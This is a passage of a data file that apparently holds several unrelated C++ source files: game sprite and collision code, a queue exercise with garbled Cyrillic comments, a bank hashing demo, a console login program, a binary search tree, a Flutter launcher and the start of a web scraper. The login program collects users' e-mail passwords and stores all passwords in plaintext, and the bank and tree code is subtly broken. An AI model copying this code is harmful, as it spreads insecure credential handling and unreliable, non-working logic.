= sprite * 32;\n\t\t\t\tsrc.y = 0;\n\t\t\t\tsrc.w = 32;\n\t\t\t\tsrc.h = 32;\n\n\t\t\t\tSDL_Rect dst;\n\t\t\t\tdst.x = getX();\n\t\t\t\tdst.y = getY();\n\t\t\t\tdst.w = src.w * 2;\n\t\t\t\tdst.h = src.h * 2;\n\n\t\t\t\tSDL_RenderCopy(renderer, getTex(), &src, &dst);\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tSDL_Rect src; \n\t\t\t\tif(direction == 1) src.x = 0;\n\t\t\t\telse if(direction == 0) src.x = 6 * 32;\n\t\t\t\tsrc.y = 0;\n\t\t\t\tsrc.w = 32;\n\t\t\t\tsrc.h = 32;\n\n\t\t\t\tSDL_Rect dst;\n\t\t\t\tdst.x = getX();\n\t\t\t\tdst.y = getY();\n\t\t\t\tdst.w = src.w * 2;\n\t\t\t\tdst.h = src.h * 2;\n\n\t\t\t\tSDL_RenderCopy(renderer, getTex(), &src, &dst);\n\t\t\t}\n\t\t}\n}\n\n//Hitboxes.\nSDL_Rect Player::getBounds()\n{\n\t\tint width = 64; \n\t\tint height = 64; \n\n\t\tSDL_Rect rect; \n\t\trect.x = (int)(getX()+(width/2)-((width/2)/2))-2;\n\t\trect.y = (int)getY()+(height/2);\n\t\trect.w = width-30; \n\t\trect.h = height/2; \n\n\t\treturn rect; \n}\n\nSDL_Rect Player::getBoundsTop()\n{\n\t\tint width = 64; \n\t\tint height = 64; \n\n\t\tSDL_Rect rect; \n\t\trect.x = (int)(getX()+(width/2)-((width/2)/2))-2;\n\t\trect.y = (int)getY();\n\t\trect.w = width-30; \n\t\trect.h = height/2; \n\n\t\treturn rect; \n}\n\nSDL_Rect Player::getBoundsLeft()\n{\n\t\tint width = 64; \n\t\tint height = 64; \n\n\t\tSDL_Rect rect; \n\t\trect.x = (int)getX() + 11;\n\t\trect.y = (int)getY();\n\t\trect.w = 5; \n\t\trect.h = height - 11; \n\n\t\treturn rect; \n}\n\nSDL_Rect Player::getBoundsRight()\n{\n\t\tint width = 64; \n\t\tint height = 64; \n\n\t\tSDL_Rect rect; \n\t\trect.x = (int)getX()+width - 18;\n\t\trect.y = (int)getY();\n\t\trect.w = 5; \n\t\trect.h = height - 11; \n\n\t\treturn rect; \n}\n\n//Getters and Setters.\nvoid Player::setCreating(bool pCreating)\n{\n\t\tcreating = pCreating;\n}\n\nvoid Player::setFireballs(int pFireballs)\n{\n\t\tfireballs = pFireballs;\n}\n\nbool Player::getCreating()\n{\n\t\treturn creating;\n}\n\nint Player::getFireballs()\n{\n\t\treturn fireballs; \n}\n\nbool Player::getCrushed()\n{\n\t\treturn crushed;\n}\n\n//Function used when a new game is started.\nvoid Player::playerReset()\n{\n\t\tsetX(50);\n\t\tsetY(736);\n\t\tsetFalling(false);\n\t\tsetJumping(false);\n\t\tfireballs = 10; \n\t\tdirection = 1;\n\t\tcreating = false;\n\t\tcrushed = false;\n}\n\n//Function to check collision.\nvoid Player::Collision(std::vector<Entity*> handler)\n{\n\t\tbool onTop = false; \n\n\t\tfor(int i = 0; i < handler.size(); i++)\n\t\t{\n\t\t\tEntity* tempObject = handler[i];\n\n\t\t\tif(tempObject->getType() == 1)\n\t\t\t{\n\t\t\t\tif(intersect(getBoundsLeft(), tempObject->getBoundsRight()))\n\t\t\t\t{\n\t\t\t\t\tsetX(tempObject->getX() + 85);\n\t\t\t\t}\n\n\t\t\t\tif(intersect(getBoundsRight(), tempObject->getBoundsLeft()))\n\t\t\t\t{\n\t\t\t\t\tsetX(tempObject->getX() - 50);\n\t\t\t\t}\n\n\t\t\t\tif(intersect(getBounds(), tempObject->getBoundsTop()))\n\t\t\t\t{\n\t\t\t\t\tonTop = true; \n\t\t\t\t\tsetY(tempObject->getY() - 64);\n\t\t\t\t\tsetVelY(tempObject->getVelY());\n\t\t\t\t\tsetJumping(false);\n\t\t\t\t\tsetFalling(false);\n\t\t\t\t}\n\n\t\t\t\tif(intersect(getBoundsTop(), tempObject->getBounds()))\n\t\t\t\t{\n\t\t\t\t\tsetJumping(false);\n\t\t\t\t\tsetFalling(true);\n\t\t\t\t\tsetVelY(tempObject->getVelY());\n\t\t\t\t\tsetY(tempObject->getY() + 96);\t\n\n\t\t\t\t\tif(onTop || getY() >= 736) crushed = true;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\ti",
    "#include \"C:\\Users\\\u00ca\u00f0\u00e8\u00f1\u00f2\u00e8\u00ed\u00e0\\source\\repos\\\u00eb\u00f0 11 \u00ee\u00e0\\\u00e7\u00e0\u00e4\u00e0\u00f7\u00e0 2\\Money.h\"\r\n#include <iostream>\r\n#include <queue>\r\n#include <vector>\r\ntypedef queue <Money> St;\r\ntypedef vector<Money>Vec;//\u00e2\u00e5\u00ea\u00f2\u00ee\u00f0\r\nusing namespace std;\r\nSt make_stack(int n)\r\n{\r\n\tSt s;\r\n\tMoney t;\r\n\tfor (int i = 0; i < n; i++)\r\n\t{\r\n\t\tcin >> t;//\u00e2\u00e2\u00ee\u00e4 \u00ef\u00e5\u00f0\u00e5\u00ec\u00e5\u00ed\u00ed\u00ee\u00e9\r\n\t\ts.push(t);//\u00e4\u00ee\u00e1\u00e0\u00e2\u00eb\u00e5\u00ed\u00e8\u00e5 \u00e5\u00e5 \u00e2 \u00f1\u00f2\u00e5\u00ea\r\n\t}\r\n\treturn s;//\u00e2\u00e5\u00f0\u00ed\u00f3\u00f2\u00fc \u00f1\u00f2\u00e5\u00ea \u00ea\u00e0\u00ea \u00f0\u00e5\u00e7\u00f3\u00eb\u00fc\u00f2\u00e0\u00f2 \u00f4\u00f3\u00ed\u00ea\u00f6\u00e8\u00e8\r\n}\r\n//\u00ea\u00ee\u00ef\u00e8\u00f0\u00f3\u00e5\u00f2 \u00f1\u00f2\u00e5\u00ea \u00e2 \u00e2\u00e5\u00ea\u00f2\u00ee\u00f0\r\nVec stack_to_vector(St s)\r\n{\r\n\tVec v;\r\n\twhile (!s.empty())//\u00ef\u00ee\u00ea\u00e0 \u00f1\u00f2\u00e5\u00ea \u00ed\u00e5 \u00ef\u00f3\u00f1\u00f2\u00ee\u00e9\r\n\t{\r\n\t\t//\u00e4\u00ee\u00e1\u00e0\u00e2\u00e8\u00f2\u00fc \u00e2 \u00e2\u00e5\u00ea\u00f2\u00ee\u00f0 \u00fd\u00eb\u00e5\u00ec\u00e5\u00ed\u00f2 \u00e8\u00e7 \u00e2\u00e5\u00f0\u00f8\u00e8\u00fb \u00f1\u00f2\u00e5\u00ea\u00e0\r\n\t\tv.push_back(s.front());\r\n\t\ts.pop();\r\n\t}\r\n\treturn v; //\u00e2\u00e5\u00f0\u00ed\u00f3\u00f2\u00fc \u00e2\u00e5\u00ea\u00f2\u00ee\u00f0 \u00ea\u00e0\u00ea \u00f0\u00e5\u00e7\u00f3\u00eb\u00fc\u00f2\u00e0\u00f2 \u00f4\u00f3\u00ed\u00ea\u00f6\u00e8\u00e8\r\n}\r\n//\u00ea\u00ee\u00ef\u00e8\u00f0\u00f3\u00e5\u00f2 \u00e2\u00e5\u00ea\u00f2\u00ee\u00f0 \u00e2 \u00f1\u00f2\u00e5\u00ea\r\nSt vector_to_stack(Vec v)\r\n{\r\n\tSt s;\r\n\tfor (int i = 0; i < v.size(); i++)\r\n\t{\r\n\t\ts.push(v[i]);//\u00e4\u00ee\u00e1\u00e0\u00e2\u00e8\u00f2\u00fc \u00e2 \u00f1\u00f2\u00e5\u00ea \u00fd\u00eb\u00e5\u00ec\u00e5\u00ed\u00f2 \u00e2\u00e5\u00ea\u00f2\u00ee\u00f0\u00e0\r\n\t}\r\n\treturn s; //\u00e2\u00e5\u00f0\u00ed\u00f3\u00f2\u00fc \u00f1\u00f2\u00e5\u00ea \u00ea\u00e0\u00ea \u00f0\u00e5\u00e7\u00f3\u00eb\u00fc\u00f2\u00e0\u00f2 \u00f4\u00f3\u00ed\u00ea\u00f6\u00e8\u00e8\r\n}\r\nvoid print_stack(St P)\r\n{\r\n\twhile (!P.empty())\r\n\t{\r\n\t\tcout << P.front() << ' ';//\u00e2\u00fb\u00e2\u00e5\u00f1\u00f2\u00e8 \u00ef\u00e5\u00f0\u00e2\u00fb\u00e9 \u00fd\u00eb\u00e5\u00ec\u00e5\u00ed\u00f2\r\n\t\tP.pop();//\u00f3\u00e4\u00e0\u00eb\u00e8\u00f2\u00fc \u00fd\u00eb\u00e5\u00ec\u00e5\u00ed\u00f2 \u00e8\u00e7 \u00ed\u00e0\u00f7\u00e0\u00eb\u00e0\r\n\t}\r\n}\r\nMoney avarage(St q)//\u00e2\u00fb\u00f7\u00e8\u00f1\u00eb\u00e5\u00ed\u00e8\u00e5 \u00f1\u00f0\u00e5\u00e4\u00ed\u00e5\u00e3\u00ee \u00e0\u00f0\u00e8\u00f4\u00ec\u00e5\u00f2\u00e8\u00f7\u00e5\u00f1\u00ea\u00ee\u00e3\u00ee\r\n{\r\n\tMoney s;\r\n\tVec v = stack_to_vector(q);\r\n\tfor (int i = 0; i < v.size(); i++)\r\n\t\ts = v[i] + s;\r\n\tint n = v.size();\r\n\treturn s / n;\r\n}\r\nMoney min(St q)//\u00ef\u00ee\u00e8\u00f1\u00ea \u00ec\u00e8\u00ed\u00e8\u00ec\u00e0\u00eb\u00fc\u00ed\u00ee\u00e3\u00ee \u00fd\u00eb\u00e5\u00ec\u00e5\u00ed\u00f2\u00e0\r\n{\r\n\tVec v = stack_to_vector(q);\r\n\tMoney m = v[0];//\u00ec\u00e8\u00ed\u00e8\u00ec\u00e0\u00eb\u00fc\u00ed\u00fb\u00e9 \u00fd\u00eb\u00e5\u00ec\u00e5\u00ed\u00f2\r\n\tfor (int i = 0; i < v.size(); i++)//\u00ef\u00e5\u00f0\u00e5\u00e1\u00ee\u00f0 \u00e2\u00e5\u00ea\u00f2\u00ee\u00f0\u00e0\r\n\t\tif (m > v[i]) {\r\n\t\t\tm = v[i];//\u00ec\u00e8\u00ed\u00e8\u00ec\u00e0\u00eb\u00fc\u00ed\u00fb\u00e9 \u00fd\u00eb\u00e5\u00ec\u00e5\u00ed\u00f2\r\n\t\t}\r\n\treturn m;\r\n}\r\nvoid add_vector(St& s, int pos)//\u00e4\u00ee\u00e1\u00e0\u00e2\u00eb\u00ff\u00e5\u00ec \u00ed\u00e0 \u00ec\u00e5\u00f1\u00f2\u00ee pos \u00fd\u00eb\u00e5\u00ec\u00e5\u00ed\u00f2 el\r\n{\r\n\tMoney el = min(s);\r\n\tVec v = stack_to_vector(s);\r\n\tv.insert(v.begin() + pos, el);\r\n\ts = vector_to_stack(v);\r\n}\r\nvoid del_vector(St& q)//\u00f3\u00e4\u00e0\u00eb\u00e8\u00f2\u00fc\r\n{\r\n\tVec v = stack_to_vector(q); int p = 0; Money a = avarage(q);\r\n\twhile (p < v.size())\r\n\t{\r\n\t\tauto iter = v.cbegin();\r\n\t\tif (v[p] > a)\r\n\t\t{\r\n\t\t\tv.erase(iter + p);\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\tp++;\r\n\t\t}\r\n\t}\r\n\tq = vector_to_stack(v);\r\n}\r\nMoney max(St q)//\u00ef\u00ee\u00e8\u00f1\u00ea \u00ec\u00e0\u00ea\u00f1\u00e8\u00ec\u00e0\u00eb\u00fc\u00ed\u00ee\u00e3\u00ee \u00fd\u00eb\u00e5\u00ec\u00e5\u00ed\u00f2\u00e0\r\n{\r\n\tVec v = stack_to_vector(q);\r\n\tMoney m = v[0];\r\n\tfor (int i = 0; i < v.size(); i++)\r\n\t\tif (m < v[i])\r\n\t\t{\r\n\t\t\tm = v[i];\r\n\t\t}\r\n\treturn m;\r\n}\r\nvoid multiplication(St& q)\r\n{\r\n\tVec v = stack_to_vector(q);\r\n\tMoney m = max(q);\r\n\tfor (int i = 0; i < v.size(); i++)\r\n\t\tv[i] = v[i] * m;\r\n\tq = vector_to_stack(v);\r\n}\r\nvoid main()\r\n{\r\n\tMoney t;\r\n\tSt s;\r\n\tint n;\r\n\tcout << \"n?\";\r\n\tcin >> n;\r\n\ts = make_stack(n);\r\n\tprint_stack(s);\r\n\tcout << \"\\npos?\";\r\n\tcin >> n;\r\n\tadd_vector(s, n);\r\n\tprint_stack(s); cout << \"\\n\";\r\n\tdel_vector(s);\r\n\tprint_stack(s); cout << \"\\n\";\r\n\tmultiplication(s);\r\n\tprint_stack(s); cout << \"\\n\";\r\n}",
    "#include <iostream>\r\n#include <vector>\r\n#include <list>\r\n#include <unordered_map>\r\n#include <algorithm>\r\n#include <string>\r\n\r\nstruct Account {\r\n    std::string id;\r\n    int balance;\r\n};\r\n\r\nclass UniqueBank {\r\nprivate:\r\n    int M;\r\n    std::vector<std::list<Account>> separateChaining;\r\n    std::vector<Account> quadraticProbing;\r\n    std::unordered_map<std::string, int> hashMap;\r\n    std::vector<Account*> binarySearchTree;\r\n    std::vector<Account> simpleHashTable;\r\n    int size;\r\n\r\n    int hash(std::string id) {\r\n        // Custom hash function combining various methods\r\n        int hashValue = 0;\r\n        for (char c : id) {\r\n            hashValue += int(c);\r\n        }\r\n        return hashValue % M;\r\n    }\r\n\r\n    void insertNode(Account* node, Account acc) {\r\n        if (node == nullptr) {\r\n            node = new Account(acc);\r\n        } else if (acc.id < node->id) {\r\n            insertNode(node->left, acc);\r\n        } else if (acc.id > node->id) {\r\n            insertNode(node->right, acc);\r\n        } else {\r\n            // Handle duplicate IDs\r\n        }\r\n    }\r\n\r\n    void getTopKHelper(Account* node, std::vector<int>& balances, int& k) {\r\n        if (node == nullptr || k <= 0) return;\r\n        getTopKHelper(node->right, balances, k);\r\n        if (k > 0) {\r\n            balances.push_back(node->balance);\r\n            k--;\r\n        }\r\n        getTopKHelper(node->left, balances, k);\r\n    }\r\n\r\npublic:\r\n    UniqueBank() : M(100), separateChaining(M), quadraticProbing(M, {\"\", -1}), size(0) {}\r\n\r\n    void createAccount(std::string id, int count) {\r\n        int index = hash(id);\r\n        int probe = 1;\r\n        while (quadraticProbing[index].balance != -1) {\r\n            index = (index + probe * probe) % M;\r\n            probe++;\r\n        }\r\n        quadraticProbing[index] = {id, count};\r\n\r\n        separateChaining[index].push_back({id, count});\r\n        hashMap[id] = count;\r\n\r\n        Account* bstNode = nullptr;\r\n        insertNode(bstNode, {id, count});\r\n        binarySearchTree.push_back(bstNode);\r\n\r\n        int simpleIndex = id.length() % M;\r\n        while (simpleHashTable[simpleIndex].balance != -1) {\r\n            simpleIndex = (simpleIndex + 1) % M;\r\n        }\r\n        simpleHashTable[simpleIndex] = {id, count};\r\n\r\n        size++;\r\n    }\r\n\r\n    std::vector<int> getTopK(int k) {\r\n        std::vector<int> balances;\r\n        \r\n        // Quadratic Probing\r\n        for (const auto& acc : quadraticProbing) {\r\n            if (acc.balance != -1) {\r\n                balances.push_back(acc.balance);\r\n            }\r\n        }\r\n        \r\n        // Separate Chaining\r\n        for (const auto& bucket : separateChaining) {\r\n            for (const auto& acc : bucket) {\r\n                balances.push_back(acc.balance);\r\n            }\r\n        }\r\n        \r\n        // Hash Map\r\n        for (const auto& pair : hashMap) {\r\n            balances.push_back(pair.second);\r\n        }\r\n        \r\n        // Binary Search Tree\r\n        for (const auto& node : binarySearchTree) {\r\n            if (node != nullptr) {\r\n                getTopKHelper(node, balances, k);\r\n            }\r\n        }\r\n        \r\n        // Simple Hash Table\r\n        for (const auto& acc : simpleHashTable) {\r\n            if (acc.balance != -1) {\r\n                balances.push_back(acc.balance);\r\n            }\r\n        }\r\n        \r\n        // Custom sorting logic\r\n        std::sort(balances.begin(), balances.end(), std::greater<int>());\r\n        balances.resize(std::min(k, int(balances.size())));\r\n        \r\n        return balances;\r\n    }\r\n\r\n    // Implementations of other methods like addTransaction, getBalance, etc.\r\n};\r\n\r\nint main() {\r\n    UniqueBank bank;\r\n\r\n    // Example usage\r\n    bank.createAccount(\"JohnDoe12345\", 1000);\r\n    bank.createAccount(\"JaneSmith67890\", 500);\r\n    bank.createAccount(\"AliceWonderland24680\", 1200);\r\n\r\n    std::vector<int> topBalances = bank.getTopK(2);\r\n    std::cout << \"Top balances: \";\r\n    for (int balance : topBalances) {\r\n        std::cout << balance << \" \";\r\n    }\r\n    std::cout << std::endl;\r\n\r\n    return 0;\r\n}\r\n\r\n\r\n",
    "#include <iostream>\r\n#include <string>\r\n#include <fstream>\r\nusing namespace std;\r\n\r\nclass account\r\n{\r\nprivate:\r\n    string username, email, password, epass;\r\n\r\npublic:\r\n    void signup(); // Function prototype for signing up\r\n    void login();  // Function prototype for logging in\r\n    void forgot();\r\n};\r\n\r\nint main()\r\n{\r\n    account a1;           // Create an instance of the account class\r\n    cout << \"\\n1-LOGIN\";  // Display option for login\r\n    cout << \"\\n2-SIGNUP\"; // Display option for signup\r\n    cout << \"\\n3-FORGOT PASSWORD\"<<endl;\r\n    int choice;\r\n    cin >> choice; // Read the user's choice\r\n    cin.ignore();  // Ignore the newline character left in the buffer after cin\r\n\r\n    // Switch to handle the user's choice\r\n    switch (choice)\r\n    {\r\n    case 1:\r\n        a1.login(); // Call the login function\r\n        break;\r\n    case 2:\r\n        a1.signup(); // Call the signup function\r\n        break;\r\n    case 3:\r\n        a1.forgot();\r\n        break;\r\n    default:\r\n        cout << \"invalid choice\" << endl; // Display message for invalid choice\r\n    }\r\n\r\n    return 0;\r\n}\r\n\r\n// Function definition for signing up\r\nvoid account::signup()\r\n{\r\n    cout << \"\\t\\t\\t---------------------------------------WELCOME TO SIGN UP PAGE------------------------------------------------\" << endl; // Display signup page heading\r\n    cout << \"enter your E-MAIL address\" << endl;                                                                                            // Prompt for email\r\n    getline(cin, email);                                                                                                                    // Read email input\r\n    cout << \"enter the EMAIL PASSWORD for sign up\" << endl;\r\n    getline(cin, epass);\r\n    cout << \"enter your USERNAME\" << endl;      // Prompt for username\r\n    getline(cin, username);                     // Read username input\r\n    cout << \"create a strong password\" << endl; // Prompt for password\r\n    getline(cin, password);                     // Read password input\r\n    ofstream out(\"signup.txt\", ios::app);       // Open signup.txt file for appending\r\n    if (out.is_open())                          // Check if the file is successfully opened\r\n    {\r\n        out << \"USERNAME:\" << username << endl;     // Write username to file\r\n        out << \"EMAIL:\" << email << endl;           // Write email to file\r\n        out << \"PASSWORD:\" << password << endl;     // Write password to file\r\n        out << \"E-MAIL KEY:\" << epass << endl; // write email password\r\n        out << \"-------------------------\" << endl; // Write separator to file\r\n        out.close();                                // Close the file\r\n        cout << \"SIGN-UP is SUCCESSFULL\";           // Display success message\r\n    }\r\n    else\r\n        cout << \"ERROR! file not opening\" << endl; // Display error message if file not opened\r\n}\r\n\r\n// Function definition for logging in\r\nvoid account::login()\r\n{\r\n    cout << \"------------------------WELCOME TO LOGIN PAGE------------------------\" << endl; // Display login heading\r\n    cout << \"enter the useranme\" << endl;                                                    // Prompt for username\r\n    getline(cin, username);                                                                  // Read username input\r\n    cout << \"enter the password\" << endl;                                                    // Prompt for password\r\n    getline(cin, password);                                                                  // Read password input\r\n    ifstream in(\"signup.txt\");                                                               // Open signup.txt file for reading\r\n    if (in.is_open())                                                                        // Check if the file is successfully opened\r\n    {\r\n        string line;              // Variable to store each line of the file\r\n        bool found = false;       // Flag to indicate if username is found\r\n        while (getline(in, line)) // Read each line of the file\r\n        {\r\n            if (line.find(\"USERNAME:\" + username) != string::npos) // Check if the line contains the username\r\n            {\r\n                found = true;      // Set found flag to true\r\n                getline(in, line); // Read the next line (email)--unneccessary\r\n                getline(in, line); // Read the next line (password)\r\n\r\n                if (line.find(\"PASSWORD:\" + password) != string::npos) // Check if the line contains the password\r\n                {\r\n                    cout << \"CONGRATULATIONS!--LOGIN SUCCESSFULL--\" << endl; // Display success message\r\n                    in.close();                                              // Close the file\r\n                    return;\r\n                }\r\n                else\r\n                {\r\n                    cout << \"incorrect password! try again later\" << endl; // Display error message for incorrect password\r\n                    in.close();                                            // Close ",
    "#include <iostream>\r\n#include \"data.h\"\r\nusing namespace std;\r\n\r\nclass Node {\r\npublic:\r\n    int key;\r\n    Node* left;\r\n    Node* right;\r\n\r\n    Node(int key) {\r\n        this->key = key;\r\n        this->left = NULL;\r\n        this->right = NULL;\r\n    }\r\n};\r\n\r\nclass BST {\r\nprivate:\r\n    Node* root;\r\n\r\n    void insertNode(Node*& node, int key) {\r\n        if (node == NULL) {\r\n            node = new Node(key);\r\n            return;\r\n        }\r\n\r\n        if (key < node->key) {\r\n            insertNode(node->left, key);\r\n        } else if (key > node->key) {\r\n            insertNode(node->right, key);\r\n        }\r\n    }\r\n\r\n    Node* searchNode(Node* node, int key) {\r\n\t\tnode = this->root;\r\n\t\twhile (node != NULL){\r\n\t\t\tif (node->key == key){\r\n\t\t\t\treturn node;\r\n\t\t\t} else if (node -> key < key){\r\n\t\t\t\tnode = node-> right;\r\n\t\t\t} else {\r\n\t\t\t\tnode = node -> left;\r\n\t\t\t}\r\n\t\t}\r\n }\r\n\r\n    Node* findMin(Node* node) {\r\n        while (node->left != NULL) {\r\n            node = node->left;\r\n        }\r\n\r\n        return node;\r\n    }\r\n\r\n    Node* deleteNode(Node*& node, int key) {\r\n        if (node == NULL) {\r\n            return node;\r\n        }\r\n\r\n        if (key < node->key) {\r\n            node->left = deleteNode(node->left, key);\r\n        } else if (key > node->key) {\r\n            node->right = deleteNode(node->right, key);\r\n        } else {\r\n            if (node->left == NULL) {\r\n                Node* temp = node->right;\r\n                delete node;\r\n                return temp;\r\n            } else if (node->right == NULL) {\r\n                Node* temp = node->left;\r\n                delete node;\r\n                return temp;\r\n            }\r\n\r\n            Node* temp = findMin(node->right);\r\n            node->key = temp->key;\r\n            node->right = deleteNode(node->right, temp->key);\r\n        }\r\n\r\n        return node;\r\n    }\r\n\r\n    void inorderTraversal(Node* node) {\r\n    \tif(node){\r\n    \t\tinorderTraversal(node->left);\r\n    \t\tcout << node->key << \" \";\r\n    \t\tinorderTraversal(node->right);\r\n\t\t}\r\n    }\r\n\r\n    void preorderTraversal(Node* node) {\r\n\t\tif(node){\r\n\t\t\tcout << node->key << \" \";\r\n\t\t\tpreorderTraversal(node->left);\r\n\t\t\tpreorderTraversal(node->right);\r\n\t\t}\r\n    }\r\n\r\n    void postorderTraversal(Node* node) {\r\n\t\tif(node){\r\n\t\t\tpostorderTraversal(node->left);\r\n\t\t\tpostorderTraversal(node->right);\r\n\t\t\tcout << node->key << \" \";\r\n\t\t}\r\n    }\r\n\r\n    void displayBST(Node* node, int space) {\r\n        if (node == NULL) {\r\n            return;\r\n        }\r\n\r\n        space += 5;\r\n        displayBST(node->right, space);\r\n\r\n        cout << endl;\r\n        for (int i = 5; i < space; i++) {\r\n            cout << \" \";\r\n        }\r\n        cout << node->key << \"\\n\";\r\n\r\n        displayBST(node->left, space);\r\n    }\r\n\r\npublic:\r\n    BST() {\r\n        this->root = NULL;\r\n    }\r\n\r\n    void insert(int key) {\r\n        insertNode(this->root, key);\r\n    }\r\n\r\n    Node* search(int key) {\r\n        return searchNode(this->root, key);\r\n    }\r\n\r\n    void remove(int key) {\r\n        deleteNode(this->root, key);\r\n    }\r\n\r\n    void inorder() {\r\n        inorderTraversal(this->root);\r\ncout << endl;\r\n}\r\n\r\nvoid preorder() {\r\n    preorderTraversal(this->root);\r\n    cout << endl;\r\n}\r\n\r\nvoid postorder() {\r\n    postorderTraversal(this->root);\r\n    cout << endl;\r\n}\r\n\r\nvoid display() {\r\n    displayBST(this->root, 0);\r\n}\r\n};\r\n\r\nint main() {\r\nBST bst;\r\nbst.insert(50);\r\nbst.insert(30);\r\nbst.insert(70);\r\nbst.insert(20);\r\nbst.insert(40);\r\nbst.insert(60);\r\nbst.insert(80);\r\n\r\ncout << \"Inorder traversal: \";\r\nbst.inorder();\r\n\r\ncout << \"Preorder traversal: \";\r\nbst.preorder();\r\n\r\ncout << \"Postorder traversal: \";\r\nbst.postorder();\r\n\r\ncout << \"Displaying BST:\\n\";\r\nbst.display();\r\n\r\nNode* searchedNode = bst.search(60);\r\nif (searchedNode == NULL) {\r\n    cout << \"Node not found in the BST\\n\";\r\n} else {\r\n    cout << \"Node found in the BST: \" << searchedNode->key << endl;\r\n}\r\n\r\nbst.remove(30);\r\n\r\ncout << \"Inorder traversal after deleting a node: \";\r\nbst.inorder();\r\n\r\nreturn 0;\r\n}\r\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"gpay\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <fstream>\n#include <string>\n#include <vector>\n#include <chrono>\n#include <thread>\n#include <mutex>\n#include <queue>\n#include <csignal>\n#include <sqlite3.h>\n#include <curl/curl.h>\n#include <libxml/HTMLparser.h>\n#include <libxml/xpath.h>\n#include <iomanip>\n#include <ctime>\n#include <regex>\n#include <unordered_set> // for visited URLs\n#include <sstream> //for string manipulation\n#include <EmailAddress.h> // Library for email validation\n\n// Global variables\nstd::mutex url_mutex, file_mutex, db_mutex;\nstd::queue<std::pair<std::string, int>> url_queue;\nconst std::string base_url = \"https://example.com/\";\nconst std::string initial_url = base_url;\nconst int max_threads = 8;\nconst int max_depth = 5;\nsqlite3* db = nullptr;\nstd::string robots_txt_content;\nstd::unordered_set<std::string> visited_urls;\n\nstruct JobInfo {\n    std::string title;\n    std::string location;\n    std::string salary;\n    std::string datePosted;\n    std::string dueDate;\n    std::string emailAddress;\n    std::string applicationLink;\n};\n\n// Function prototypes\nstd::string normalize_url(const std::string& url);\nstatic size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* output);\nstd::vector<JobInfo> parse_html(const std::string& html, const std::string& base_url);\nstd::vector<std::string> extract_links(const std::string& html);\nvoid fetch_robots_txt();\nbool is_allowed(const std::string& url);\nvoid save_to_db(const std::string& url, const std::vector<JobInfo>& jobs);\nvoid scrape_url(CURL* curl, const std::string& url, int depth, int max_retries);\nvoid worker(int id);\nvoid signal_handler(int signal_num);\nvoid log_error(const std::string& message);\n// Improved data parsing using multiple formats and stringstream\nstd::string standardize_date(const std::string& date);\nbool validate_email(const std::string& email);\nstd::string make_absolute_url(const std::string& base_url, const std::string& relative_url);\nvoid initialize_db_and_log();\nvoid cleanup_db_and_log();\n\nstd::string normalize_url(const std::string& url) {\n    if (url.empty()) return \"\";\n    if (url.find(\"http://\") == 0 || url.find(\"https://\") == 0) return url;\n    if (url[0] == '/') return base_url + url.substr(1);\n    if (url.find(\"://\") != std::string::npos) return url;\n    return base_url + url;\n}\n\nstatic size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* output) {\n    size_t total_size = size * nmemb;\n    output->append((char*)contents, total_size);\n    return total_size;\n}\n\nstd::vector<JobInfo> parse_html(const std::string& html, const std::string& base_url) {\n    std::vector<JobInfo> jobs;\n    htmlDocPtr doc = htmlReadMemory(html.c_str(), html.length(), NULL, NULL, HTML_PARSE_RECOVER | HTML_PARSE_NOERROR | HTML_PARSE_NOWARNING);\n    if (!doc) {\n        log_error(\"Failed to parse HTML\");\n        return jobs;\n    }\n\n    xmlXPathContextPtr context = xmlXPathNewContext(doc);\n    if (!context) {\n        log_error(\"Failed to create XPath context\");\n        xmlFreeDoc(doc);\n        return jobs;\n    }\n\n    // Adjust these XPath expressions based on the actual structure of the website\n    const char* xpathExpressions[] = {\n        \"//div[@class='job-listing']\",\n        \"//div[@class='job-listing']//h2[@class='job-title']\",\n        \"//div[@class='job-listing']//span[@class='job-location']\",\n        \"//div[@class='job-listing']//span[@class='job-salary']\",\n        \"//div[@class='job-listing']//span[@class='date-posted']\",\n        \"//div[@class='job-listing']//span[@class='due-date']\",\n        \"//div[@class='job-listing']//a[@class='email-address']\",\n        \"//div[@class='job-listing']//a[@class='application-link']\"\n    };\n\n    xmlXPathObjectPtr result = xmlXPathEvalExpression((xmlChar*)xpathExpressions[0], context);\n    if (!result) {\n        log_error(\"Failed to evaluate XPath expression\");\n        xmlXPathFreeContext(context);\n        xmlFreeDoc(doc);\n        return jobs;\n    }\n\n    if (result->nodesetval) {\n        xmlNodeSetPtr nodeset = result->nodesetval;\n        for (int i = 0; i < nodeset->nodeNr; i++) {\n            JobInfo job;\n\n            xmlXPathContextPtr jobContext = xmlXPathNewContext(doc);\n            xmlXPathSetContextNode(nodeset->nodeTab[i], jobContext);\n\n            for (int j = 1; j < 8; j++) {\n                xmlXPathObjectPtr fieldResult = xmlXPathEvalExpression((xmlChar*)xpathExpressions[j], jobContext);\n                if (fieldResult && fieldResult->nodesetval && fieldResult->nodesetval->nodeNr > 0) {\n                    xmlChar* content = xmlNodeGetContent(fieldResult->nodesetval->nodeTab[0]);\n                    if (content) {\n                        std::string value = 